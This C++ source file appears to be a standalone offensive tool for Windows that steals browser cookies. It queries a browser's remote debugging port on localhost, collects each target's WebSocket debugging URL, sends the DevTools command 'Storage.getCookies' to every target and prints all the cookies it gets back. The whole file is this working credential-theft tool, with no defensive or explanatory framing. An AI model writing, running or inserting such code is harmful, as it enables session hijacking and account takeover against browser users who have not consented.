#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <winhttp.h>
#include <iostream>
#include <string>
#include <vector>
#include <stdio.h>

#pragma comment (lib, "winhttp.lib")

// Clean debugging URLs
std::string cleanUrl(std::string debugUrl) {
    debugUrl.erase(std::remove(debugUrl.begin(), debugUrl.end(), '\"'), debugUrl.end());
    debugUrl.erase(std::remove(debugUrl.begin(), debugUrl.end(), '}'), debugUrl.end());
    debugUrl.erase(std::remove(debugUrl.begin(), debugUrl.end(), ','), debugUrl.end());
    debugUrl.erase(std::remove(debugUrl.begin(), debugUrl.end(), ' '), debugUrl.end());
    debugUrl.erase(std::remove(debugUrl.begin(), debugUrl.end(), '\r'), debugUrl.end());
    debugUrl.erase(std::remove(debugUrl.begin(), debugUrl.end(), '\n'), debugUrl.end());
    debugUrl.erase(0, 20); // remove ws://127.0.0.1

    return debugUrl;
}

// Create a vector of the WS debugging URLs
std::vector<std::string> parseJsonEndpoint(std::string str)
{
    std::vector<std::string> debugList;
    int n = str.length();
    std::string word = "";
    for (int i = 0; i < n; i++) {
        if (str[i] == ' ' or i == (n - 1)) {
            if (word[1] == 'w' && word[2] == 's' && word[3] == ':') {

                std::string url = word + str[i];
                std::string debugUrl = cleanUrl(url);
                debugList.push_back(debugUrl);
            }
            word = "";
        }
        else {
            word += str[i];
        }
    }
    return debugList;
}

// Convert char* to wchar_t*
const wchar_t* convertWS(const char* c)
{
    const size_t cSize = strlen(c) + 1;
    wchar_t* wc = new wchar_t[cSize];
    mbstowcs(wc, c, cSize);
    return wc;
}

// Takes WS debugging URL as input and prints cookie info
int dumpCookies(const char* debugUrl, int port) {

    char msg[MAXBYTE] = { NULL };
    memset(msg, NULL, 39);
    snprintf(msg, 39, "{\"id\":1,\"method\":\"Storage.getCookies\"}");
    std::wstring server(L"127.0.0.1");

    HINTERNET hSession = WinHttpOpen(L"WebSocket Client", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (hSession == NULL)
    {
        std::cout << "Failed to open session." << std::endl;
        return 1;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, server.c_str(), port, 0);
    if (hConnect == NULL)
    {
        std::cout << "Failed to connect to server." << std::endl;
        WinHttpCloseHandle(hSession);
        return 1;
    }

    HINTERNET hsess = WinHttpOpenRequest(hConnect, L"GET", convertWS(debugUrl), NULL, NULL, NULL, NULL);
    if (hConnect == NULL)
    {
        std::cout << "Failed to open request." << std::endl;
        WinHttpCloseHandle(hSession);
        return 1;
    }

    if (!WinHttpSetOption(hsess, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET, NULL, 0)) {
        std::cout << "Failed to upgrade to web socket";
        return 1;
    }

    if (!WinHttpSendRequest(hsess, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0)) {
        std::cout << "Failed to send request" << std::endl;
        return 1;
    }

    if (!WinHttpReceiveResponse(hsess, NULL)) {
        std::cout << "failed to rec response" << std::endl;
        return 1;
    }
    
    HINTERNET hWebSocket = WinHttpWebSocketCompleteUpgrade(hsess, 0);
    if (hWebSocket == NULL) {
        std::cout << "Failed to complete upgrade" << std::endl;
        return 1;
    }
    WinHttpCloseHandle(hsess);

    DWORD dwError = WinHttpWebSocketSend(hWebSocket, WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE, (PVOID)msg, (DWORD)strlen(msg));
    if (dwError != ERROR_SUCCESS) {
        std::cout << "Error sending message to websocket" << std::endl;
        return 1;
    }

    BYTE rgbBuffer[MAXBYTE];
    DWORD dwBufferLength = ARRAYSIZE(rgbBuffer);
    DWORD dwBytesTransferred = 0;
    WINHTTP_WEB_SOCKET_BUFFER_TYPE eBufferType;

    do
    {
        dwError = WinHttpWebSocketReceive(hWebSocket, rgbBuffer, dwBufferLength, &dwBytesTransferred, &eBufferType);
        if (dwError != ERROR_SUCCESS)
        {
            break;
        }
        wprintf(L"%.*S", dwBytesTransferred, rgbBuffer);
    } while (eBufferType == WINHTTP_WEB_SOCKET_UTF8_FRAGMENT_BUFFER_TYPE);;

    dwError = WinHttpWebSocketClose(hWebSocket,
        WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS,
        NULL,
        0);

    return 0;
}

int wmain(int argc, wchar_t* argv[])
{

    if (argc < 2) {
        printf(" [!] Specify the remote debugging port!");
        return 1;
    }

    int port = _wtoi(argv[1]);
    std::wstring portnumber = argv[1];
    std::wstring loopbackUrl = L"http://localhost:" + portnumber + L"/json";
    std::wstring server(L"localhost");

    HINTERNET hSession = WinHttpOpen(L"WebSocket Client", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (hSession == NULL)
    {
        std::cout << "Failed to open WS session" << std::endl;
        return 1;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, server.c_str(), port, 0);
    if (hConnect == NULL)
    {
        std::cout << "Failed to connect to server" << std::endl;
        WinHttpCloseHandle(hSession);
        return 1;
    }

    HINTERNET hsess = WinHttpOpenRequest(hConnect, L"GET", L"/json", NULL, NULL, NULL, NULL);
    if (hsess == NULL)
    {
        std::cout << "Failed to open request" << std::endl;
        WinHttpCloseHandle(hSession);
        return 1;
    }

    BOOL bResults = FALSE;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;

    if (hsess)
    {
        bResults = WinHttpSendRequest(hsess, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    }
    std::string respage = "";

    if (bResults) {
        bResults = WinHttpReceiveResponse(hsess, NULL);
        
    }
    else {
        printf("error2");
    }

    if (bResults)
    {
        do
        {
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hsess, &dwSize)) {
                printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
            }
                
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                ZeroMemory(pszOutBuffer, dwSize + 1);
                if (!WinHttpReadData(hsess, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {
                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                } else
                    respage.append(pszOutBuffer);
                delete[] pszOutBuffer;
            }
        } while (dwSize > 0);
    }
        
    std::vector<std::string> endpointList;
    endpointList = parseJsonEndpoint(respage);

    for (int i = 0; i < endpointList.size(); i++) {
        dumpCookies(endpointList.at(i).c_str(), port);
    }
}
